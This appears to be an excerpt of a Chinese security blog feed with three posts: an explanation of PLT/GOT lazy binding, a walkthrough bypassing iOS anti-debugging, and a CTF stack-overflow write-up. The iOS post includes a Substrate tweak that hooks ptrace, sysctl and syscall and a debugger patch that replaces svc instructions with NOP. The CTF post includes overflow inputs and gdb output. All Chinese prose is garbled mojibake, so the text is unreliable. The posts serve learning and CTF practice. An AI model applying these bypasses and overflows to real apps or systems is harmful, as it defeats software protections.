<p>å»ºç«‹ä¸€ä¸ª GOT.PLT è¡¨ï¼Œè¯¥è¡¨ç”¨æ¥æ”¾å…¨å±€å‡½æ•°çš„å®é™…åœ°å€ï¼Œä½†æœ€å¼€å§‹æ—¶ï¼Œè¯¥é‡Œé¢æ”¾çš„ä¸æ˜¯çœŸå®çš„åœ°å€è€Œæ˜¯ä¸€ä¸ªè·³è½¬ï¼Œæ¥ä¸‹æ¥ä¼šè®²ã€‚<br>å¯¹æ¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œé“¾æ¥å™¨ç”Ÿæˆä¸€ä¸ªä¸ä¹‹ç›¸å¯¹åº”çš„å½±å­å‡½æ•°ï¼Œå¦‚ fun@pltã€‚<br>æ‰€æœ‰å¯¹ fun çš„è°ƒç”¨ï¼Œéƒ½æ¢æˆå¯¹ fun@plt çš„è°ƒç”¨ï¼Œæ¯ä¸ªfun@plt é•¿æˆå¦‚ä¸‹æ ·å­ï¼š</p>
<pre><code>fun@plt:
jmp *(fun@got.plt)
push index
jmp _init
</code></pre><p>å…¶ä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤ç›´æ¥ä» got.plt ä¸­å»æ‹¿çœŸå®çš„å‡½æ•°åœ°å€ï¼Œå¦‚æœå·²ç»ä¹‹å‰å·²ç»å‘ç”Ÿè¿‡è°ƒç”¨ï¼Œgot.plt å°±å·²ç»ä¿å­˜äº†çœŸå®çš„åœ°å€ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œåˆ™ got.plt ä¸­æ”¾çš„æ˜¯ fun@plt ä¸­çš„ç¬¬äºŒæ¡æŒ‡ä»¤ï¼Œè¿™å°±ä½¿å¾—å½“æ‰§è¡Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œfun@pltä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å…¶å®ä»€ä¹ˆäº‹ä¹Ÿæ²¡åšï¼Œç›´æ¥ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œç¬¬äºŒæ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯æŠŠå½“å‰è¦è°ƒç”¨çš„å‡½æ•°åœ¨ got.plt ä¸­çš„ç¼–å·ä½œä¸ºå‚æ•°ä¼ ç»™ _init()ï¼Œè€Œ _init() è¿™ä¸ªå‡½æ•°åˆ™ç”¨äºæŠŠ fun è¿›è¡Œé‡å®šä½ï¼Œç„¶åæŠŠç»“æœå†™å…¥åˆ° got.plt ç›¸åº”çš„åœ°æ–¹ï¼Œæœ€åç›´æ¥è·³è¿‡å»è¯¥å‡½æ•°ã€‚</p>
<p>ä»ç„¶æ˜¯ä½¿ç”¨å‰é¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬çœ‹çœ‹ g_func2 æ˜¯æ€æ ·è°ƒç”¨ g_func çš„:</p>
<pre><code>0000052f &lt;g_func2&gt;:
 52f:   55                      push   %ebp
 530:   89 e5                   mov    %esp,%ebp
 532:   53                      push   %ebx
 533:   83 ec 14                sub    $0x14,%esp
 536:   e8 00 00 00 00          call   53b &lt;g_func2+0xc&gt;
 53b:   5b                      pop    %ebx
 53c:   81 c3 91 11 00 00       add    $0x1191,%ebx
 542:   c7 45 f8 02 00 00 00    movl   $0x2,0xfffffff8(%ebp) // a = 2
 549:   83 ec 0c                sub    $0xc,%esp
 54c:   6a 03                   push   $0x3 // push argument 3 for g_func.
 54e:   e8 d5 fe ff ff          call   428 &lt;g_func@plt&gt;
 553:   83 c4 10                add    $0x10,%esp
 556:   89 45 f4                mov    %eax,0xfffffff4(%ebp)
 559:   8b 45 f4                mov    0xfffffff4(%ebp),%eax
 55c:   03 45 f8                add    0xfffffff8(%ebp),%eax
 55f:   8b 5d fc                mov    0xfffffffc(%ebp),%ebx
 562:   c9                      leave  
 563:   c3                      ret 
</code></pre><p>å¦‚ä¸Šæ±‡ç¼–ï¼ŒæŒ‡ä»¤ 536, 53b, 53c, ç”¨äºè®¡ç®— got.plt çš„å…·ä½“ä½ç½®ï¼Œè®¡ç®—æ–¹å¼ä¸å‰é¢å¯¹æ•°æ®çš„è®¿é—®åŸç†æ˜¯ä¸€æ ·çš„ï¼Œç»è®¡ç®—æ­¤æ—¶, %ebx = 0x53b + 0x1191 = 0x16cc, æ³¨æ„æŒ‡ä»¤ 54eï¼Œ è¯¥æŒ‡ä»¤è°ƒç”¨äº†å‡½æ•° g_func@plt:</p>
<pre><code>00000428 &lt;g_func@plt&gt;:
 428:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)
 42e:   68 00 00 00 00          push   $0x0
 433:   e9 e0 ff ff ff          jmp    418 &lt;_init+0x18&gt;
</code></pre><p>æ³¨æ„åˆ°æ­¤æ—¶ï¼Œ %ebx ä¸­æ”¾çš„æ˜¯ got.plt çš„åœ°å€ï¼Œg_func@plt çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ç”¨äºè·å– got.plt ä¸­ func çš„å…·ä½“åœ°å€ï¼Œ func æ”¾åœ¨ 0xc + %ebx = 0xc + 0x16cc = 0x16d8, è¿™ä¸ªåœ°å€é‡Œæ”¾çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æŸ¥ä¸€ä¸‹é‡å®šä½è¡¨ï¼š</p>
<pre><code>-bash-3.00$ objdump -R liba.so

liba.so:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
000016e0 R_386_RELATIVE    *ABS*
000016e4 R_386_RELATIVE    *ABS*
000016bc R_386_GLOB_DAT    g_share
000016c0 R_386_GLOB_DAT    __cxa_finalize
000016c4 R_386_GLOB_DAT    _Jv_RegisterClasses
000016c8 R_386_GLOB_DAT    __gmon_start__
000016d8 R_386_JUMP_SLOT   g_func
000016dc R_386_JUMP_SLOT   __cxa_finalize
</code></pre><p>å¯è§ï¼Œè¯¥åœ°å€é‡Œæ”¾çš„å°±æ˜¯ g_func çš„å…·ä½“åœ°å€ï¼Œé‚£æ­¤æ—¶ 0x16d8 æ”¾çš„æ˜¯çœŸæ­£çš„åœ°å€äº†å—ï¼Ÿæˆ‘ä»¬å†çœ‹çœ‹ got.plt:</p>
<pre><code>Contents of section .got.plt:
 16cc fc150000 00000000 00000000 2e040000  ................
 16dc 3e040000 
</code></pre><p>16d8 å¤„çš„å†…å®¹æ˜¯: 2e040000, å°ç«¯åºï¼Œæ¢å›æ•´å½¢å°±æ˜¯ 0x000042e, è¯¥åœ°å€å°±æ˜¯ fun@plt çš„ç¬¬äºŒæ¡æŒ‡ä»¤ï¼</p>
]]></content>
      <tags>
        <tag>System</tag>
      </tags>
  </entry>
  <entry>
    <title>åŠ¨æ€ç»•è¿‡iOSå†…è”svcåè°ƒè¯•</title>
    <url>/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>ä¹‹å‰åœ¨jmpewså¤§ç¥çš„<a href="http://bbs.iosre.com/t/topic/9351&quot;With a Title&quot;" target="_blank" rel="external">åè°ƒè¯•ä¸ç»•è¿‡çš„å¥‡æ·«æŠ€å·§</a>ä»¥åŠAloneMonkeyå¤§ç¥çš„<a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">å…³äºåè°ƒè¯•&amp;ååè°ƒè¯•é‚£äº›äº‹</a>è¿™ä¸¤ç¯‡æ–‡ç« ä¸­å­¦ä¹ åˆ°ä¸å°‘å…³äºiOSåè°ƒè¯•ç»•è¿‡çš„å§¿åŠ¿æŠ€å·§ï¼Œæœ¬ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹è‡ªå·±åœ¨å®é™…é€†å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„å…³äºsvcå†…è”åè°ƒè¯•çš„ç»•è¿‡è¿‡ç¨‹ã€‚<br><a id="more"></a></p>
<h1 id="iOSåè°ƒè¯•ç®€ä»‹"><a href="#iOSåè°ƒè¯•ç®€ä»‹" class="headerlink" title="iOSåè°ƒè¯•ç®€ä»‹"></a>iOSåè°ƒè¯•ç®€ä»‹</h1><p>iOSçš„åè°ƒè¯•ç›®å‰å¸¸è§åªæœ‰å‡ ç§ï¼Œä¸»è¦æ˜¯ptraceã€sysctlã€syscallå‡ ç§ï¼Œè¿™é‡Œæˆ‘å°±ä¸ç…§æœ¬å®£ç§‘çš„å»ä»‹ç»è¿™å‡ ç§åè°ƒè¯•çš„åŸç†äº†ï¼Œæˆ‘ä¸Šé¢æåˆ°çš„ä¸¤ä½å¤§ç¥çš„æ–‡ç« ä¸­æœ‰ååˆ†è¯¦ç»†çš„è¯´æ˜ã€‚</p>
<p>ç”±äºä»¥ä¸Šä¸‰ç§æ–¹å¼çš„åè°ƒè¯•ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“ç»•è¿‡ï¼Œä¸€èˆ¬é€šè¿‡Tweakç¼–å†™hookæ’ä»¶å°±å¯ä»¥è§£å†³äº†ï¼Œä¸‹é¢è´´ä¸ŠAloneMonkeyçš„ä¸€ä¸ªè„šæœ¬ï¼Œè¶³ä»¥ç»•è¿‡è¿™äº›åè°ƒè¯•<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_ptrace)</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_ptrace</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - ptrace request is PT_DENY_ATTACH"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> orig_ptrace(request,pid,addr,data);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_dlsym)(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_dlsym</span><span class="params">(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(symbol, <span class="string">"ptrace"</span>) == <span class="number">0</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - dlsym get ptrace symbol"</span>);</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">void</span>*)my_ptrace;</div><div class="line">    &#125;</div><div class="line">   	<span class="keyword">return</span> orig_dlsym(handle, symbol);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_sysctl)</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_sysctl</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> ret = orig_sysctl(name,namelen,info,infosize,newinfo,newinfosize);</div><div class="line">	<span class="keyword">if</span>(namelen == <span class="number">4</span> &amp;&amp; name[<span class="number">0</span>] == <span class="number">1</span> &amp;&amp; name[<span class="number">1</span>] == <span class="number">14</span> &amp;&amp; name[<span class="number">2</span>] == <span class="number">1</span>)&#123;</div><div class="line">		<span class="keyword">struct</span> kinfo_proc *info_ptr = (<span class="keyword">struct</span> kinfo_proc *)info;</div><div class="line">        <span class="keyword">if</span>(info_ptr &amp;&amp; (info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) != <span class="number">0</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - sysctl query trace status."</span>);</div><div class="line">            info_ptr-&gt;kp_proc.p_flag ^= P_TRACED;</div><div class="line">            <span class="keyword">if</span>((info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) == <span class="number">0</span>)&#123;</div><div class="line">                NSLog(@<span class="string">"[AntiAntiDebug] trace status reomve success!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_syscall)(<span class="keyword">int</span> code, va_list args);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_syscall</span><span class="params">(<span class="keyword">int</span> code, va_list args)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> request;</div><div class="line">    va_list newArgs;</div><div class="line">    va_copy(newArgs, args);</div><div class="line">    <span class="keyword">if</span>(code == <span class="number">26</span>)&#123;</div><div class="line">        request = (<span class="keyword">long</span>)args;</div><div class="line">        <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - syscall call ptrace, and request is PT_DENY_ATTACH"</span>);</div><div class="line">            <span class="keyword">return</span> nil;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)orig_syscall(code, newArgs);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>),(<span class="keyword">void</span>*)my_ptrace,(<span class="keyword">void</span>**)&amp;orig_ptrace);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)dlsym,(<span class="keyword">void</span>*)my_dlsym,(<span class="keyword">void</span>**)&amp;orig_dlsym);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)sysctl,(<span class="keyword">void</span>*)my_sysctl,(<span class="keyword">void</span>**)&amp;orig_sysctl);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)syscall,(<span class="keyword">void</span>*)my_syscall,(<span class="keyword">void</span>**)&amp;orig_syscall);</div><div class="line"></div><div class="line">	NSLog(@<span class="string">"[AntiAntiDebug] Module loaded!!!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging5.jpg" alt=""></p>
<h1 id="svcå†…è”åè°ƒè¯•"><a href="#svcå†…è”åè°ƒè¯•" class="headerlink" title="svcå†…è”åè°ƒè¯•"></a>svcå†…è”åè°ƒè¯•</h1><p>æ‰€è°“svcå†…è”å…¶å®å°±æ˜¯é€šè¿‡svcæ±‡ç¼–å®ç°å¯¹ptraceã€syscallçš„è°ƒç”¨ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥é€šè¿‡hookå‡½æ•°ç»•è¿‡åè°ƒè¯•ï¼Œå¢åŠ åè°ƒè¯•ç»•è¿‡éš¾åº¦ã€‚</p>
<h2 id="å¦‚ä½•ç¡®å®šiOSåº”ç”¨æ˜¯å¦é‡‡ç”¨svcå†…è”åè°ƒè¯•"><a href="#å¦‚ä½•ç¡®å®šiOSåº”ç”¨æ˜¯å¦é‡‡ç”¨svcå†…è”åè°ƒè¯•" class="headerlink" title="å¦‚ä½•ç¡®å®šiOSåº”ç”¨æ˜¯å¦é‡‡ç”¨svcå†…è”åè°ƒè¯•"></a>å¦‚ä½•ç¡®å®šiOSåº”ç”¨æ˜¯å¦é‡‡ç”¨svcå†…è”åè°ƒè¯•</h2><p>è°ƒç”¨svcå®ç°ptraceçš„æ±‡ç¼–å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #31"</span></div><div class="line"><span class="string">"mov X1, #0"</span></div><div class="line"><span class="string">"mov X2, #0"</span></div><div class="line"><span class="string">"mov X3, #0"</span></div><div class="line"><span class="string">"mov w16, #26"</span></div><div class="line"><span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
<p>è°ƒç”¨svcé€šè¿‡syscallå®ç°ptraceçš„æ±‡ç¼–å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #26"</span></div><div class="line">   <span class="string">"mov X1, #31"</span></div><div class="line">   <span class="string">"mov X2, #0"</span></div><div class="line">   <span class="string">"mov X3, #0"</span></div><div class="line">   <span class="string">"mov X4, #0"</span></div><div class="line">   <span class="string">"mov w16, #0"</span></div><div class="line">   <span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
<p>åœ¨åŠ¨æ€è°ƒè¯•iOSè¿‡ç¨‹ä¸­å¦‚æœé‡åˆ°ä¸‹é¢æƒ…å†µï¼š<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging2.jpg" alt=""></p>
<p>äºŒè¯ä¸è¯´å…ˆç¥­å‡ºä¸Šæ–‡çš„é‚£ä¸ªhookæ’ä»¶ï¼Œå¦‚æœæ’ä»¶ä¸å¥½ä½¿ï¼Œç›´æ¥é€šè¿‡IDAåˆ†æä¸»ç¨‹åºåœ¨å…¨å±€æœç´¢SVC 0x80ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½ä¸åœ¨ä¸»ç¨‹åºä¸­ï¼Œdylibä¸­ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ã€‚ä¸å·§çš„æ˜¯æˆ‘åœ¨ä¸»ç¨‹åºä¸­æœåˆ°äº†ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging7.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging1.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging6.jpg" alt=""></p>
<h2 id="ç»•è¿‡svcåè°ƒè¯•"><a href="#ç»•è¿‡svcåè°ƒè¯•" class="headerlink" title="ç»•è¿‡svcåè°ƒè¯•"></a>ç»•è¿‡svcåè°ƒè¯•</h2><p>åœ¨æ‰¾çš„è¿™ä¸¤æ®µä»£ç ä¹‹åï¼Œæƒ³èµ·å¤§ä½¬ä»¬è¯´è¿‡é‡åˆ°SVC 0x80æ— è„‘nopå°±å¥½äº†ï¼Œä½†æ˜¯åœ¨é™æ€æƒ…å†µä¸‹nopä¹‹åæ”¾å…¥è¿è¡Œæ—¶ç¨‹åºä¸­æˆ–è€…é‡æ‰“åŒ…å®‰è£…éƒ½å¹¶ä¸å¥½ä½¿æ€ä¹ˆåŠï¼Œä¸è¦æ…Œï¼Œç»è¿‡æœ¬äººå¤šæ¬¡å°è¯•ç™¾è¯•ç™¾çµçš„åŠæ³•æ¥äº†ã€‚</p>
<p>åè°ƒè¯•æ£€æµ‹å¿…ç„¶æ˜¯åœ¨ç¨‹åºå¯åŠ¨åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè¿™é‡Œé‡‡å–ä¸€ä¸ªå–å·§çš„åŠæ³•ï¼Œåœ¨æ‰‹æœºç‚¹å¼€åº”ç”¨çš„ç¬é—´ï¼Œé€šè¿‡debugserveræŒ‚è½½è¯¥APP</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging4.jpg" alt=""></p>
<p>ä¹‹ååœ¨ä¸Šé¢æ‰¾åˆ°çš„åœ°å€ä¸‹æ–­ç‚¹ï¼Œé€šè¿‡memory write address 0x1f 0x20 0x03 0xd5å°†svcæŒ‡ä»¤ä¿®æ”¹ä¸ºnopï¼Œå°†SYS_ptraceå’ŒSYS_syscalléƒ½ä¿®æ”¹å®Œæˆåï¼Œåˆ é™¤æ–­ç‚¹ï¼Œcè¿è¡Œå‘ç°åè°ƒè¯•ä»¥åŠç»•è¿‡äº†ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging3.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>åè°ƒè¯•</tag>
        <tag>ååè°ƒè¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ˆæº¢å‡ºä¹‹åˆ©ç”¨__stack_chk_fail</title>
    <url>/2017/03/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%88%A9%E7%94%A8-stack-chk-fail/</url>
    <content><![CDATA[<p>ç¨‹åºçš„ä¸»å‡½æ•°å¾ˆæ˜æ˜¾_IO_getså­˜åœ¨æ ˆæº¢å‡ºã€‚<br><a id="more"></a><br>æŸ¥çœ‹å¼€å¯çš„ä¿æŠ¤æœºåˆ¶ï¼Œå¼€äº†ä¸€å¤§å †ã€‚ã€‚ã€‚</p>
<pre><code>gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre><p>è¿™é¢˜æ˜¯å›½å¤–çš„ä¸€ä¸ªCTFé¢˜ç›®ï¼Œä»–åˆ©ç”¨çš„æ˜¯fortifyçš„æŠ¥é”™æ³„éœ²ä¿¡æ¯ï¼Œåœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œæ•°ç»„è¶Šç•Œå†™å…¥ï¼Œå¯¼è‡´ canaryå€¼è¢«ä¿®æ”¹ã€‚åœ¨å‡½æ•°é€€å‡ºæ—¶æ£€æŸ¥canaryï¼Œå‘ç°canaryè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¸èƒ½å®‰å…¨è¿”å›ï¼Œcallåˆ°__stack_chk_failæ‰“å°argv[0]è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œé»˜è®¤æ˜¯ç¨‹åºçš„åå­—ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠå®ƒè¦†ç›–ä¸ºflagçš„åœ°å€æ—¶ï¼Œå®ƒå°±ä¼šæŠŠflagç»™æ‰“å°å‡ºæ¥ã€‚</p>
<pre><code>void
__attribute__ ((noreturn))
__stack_chk_fail (void)
  {
     __fortify_fail (&quot;stack smashing detected&quot;);
  }
void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
  {
    /* The loop is added only to keep gcc happy.  */
    while (1)
      __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
              msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
  }
</code></pre><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±å°è¯•å°†ç¨‹åºæº¢å‡º</p>
<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;A&quot;*0x200+&quot;\n&quot;+&quot;a&quot;&apos;| ./smashes
Hello!
What&apos;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./smashes terminated
Aborted (core dumped)
</code></pre><p>ä¸‹ä¸€æ­¥å°±æ˜¯è®¡ç®—argv[0]åˆ°ç¼“å†²åŒºçš„è·ç¦»</p>
<pre><code>gdb-peda$ b *0x0040080e
Breakpoint 1 at 0x40080e
gdb-peda$ r
Starting program: /home/longlong/Desktop/smashes 
Hello!
What&apos;s your name? [----------------------------------registers-----------------------------------]
RAX: 0x19 
RBX: 0x0 
RCX: 0x7ffff7b00710 (&lt;__write_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x19 
RSI: 0x7ffff7dd59e0 --&gt; 0x0 
RDI: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
RBP: 0x0 
RSP: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
RIP: 0x40080e (call   0x4006c0 &lt;_IO_gets@plt&gt;)
R8 : 0x7ffff7fdb740 (0x00007ffff7fdb740)
R9 : 0x400934 (&quot;Hello!\nWhat&apos;s your name? &quot;)
R10: 0x7ffff7fdb740 (0x00007ffff7fdb740)
R11: 0x246 
R12: 0x4006ee (xor    ebp,ebp)
R13: 0x7fffffffdec0 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400804:    xor    eax,eax
   0x400806:    call   0x4006b0 &lt;__printf_chk@plt&gt;
   0x40080b:    mov    rdi,rsp
=&gt; 0x40080e:    call   0x4006c0 &lt;_IO_gets@plt&gt;
   0x400813:    test   rax,rax
   0x400816:    je     0x40089f
   0x40081c:    mov    rdx,rsp
   0x40081f:    mov    esi,0x400960
Guessed arguments:
arg[0]: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
0008| 0x7fffffffdcb8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a15000 --&gt; 0x10102464c457f 
0016| 0x7fffffffdcc0 --&gt; 0x7fffffffde10 --&gt; 0x0 
0024| 0x7fffffffdcc8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 (&quot;GLIBC_2.2.5&quot;)
0032| 0x7fffffffdcd0 --&gt; 0x1 
0040| 0x7fffffffdcd8 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
0048| 0x7fffffffdce0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
0056| 0x7fffffffdce8 --&gt; 0x7ffff7de4961 (&lt;_dl_lookup_symbol_x+305&gt;:    cmp    eax,0x0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040080e in ?? ()
gdb-peda$ find /home
Searching for &apos;/home&apos; in: None ranges
Found 8 results, display max 8 items:
[stack] : 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
[stack] : 0x7fffffffeafc (&quot;/home/longlong/.virtualenvs&quot;)
[stack] : 0x7fffffffeb69 (&quot;/home/longlong/Devel&quot;)
[stack] : 0x7fffffffec50 (&quot;/home/longlong/.virtualenvs&quot;)
[stack] : 0x7fffffffec70 (&quot;/home/longlong/Desktop&quot;)
[stack] : 0x7fffffffed82 (&quot;/home/longlong&quot;)
[stack] : 0x7fffffffefa5 (&quot;/home/longlong/.Xauthority&quot;)
[stack] : 0x7fffffffefd9 (&quot;/home/longlong/Desktop/smashes&quot;)
gdb-peda$ find 0x7fffffffe253
Searching for &apos;0x7fffffffe253&apos; in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd4018 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
[stack] : 0x7fffffffdec8 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;) 
gdb-peda$ distance $rsp 0x7fffffffdec8
From 0x7fffffffdcb0 to 0x7fffffffdec8: 536 bytes, 134 dwords
</code></pre><p>é€šè¿‡gdbè®¡ç®—å¯ä»¥çŸ¥é“argv[0]åˆ°ç¼“å†²åŒºçš„è·ç¦»æ˜¯0x218å­—èŠ‚ã€‚</p>
<p>æŸ¥æ‰¾å‘ç°flagåŒæ ·å­˜å‚¨åœ¨åˆ¶åº¦å­˜å‚¨å™¨0x400d20è¿™ä¸ªä½ç½®</p>
<pre><code>gdb-peda$ find PCTF
Searching for &apos;PCTF&apos; in: None ranges
Found 2 results, display max 2 items:
smashes : 0x400d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
smashes : 0x600d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
</code></pre><p>æœ¬åœ°è¦†ç›–ç»“æœå¦‚ä¸‹ï¼š</p>
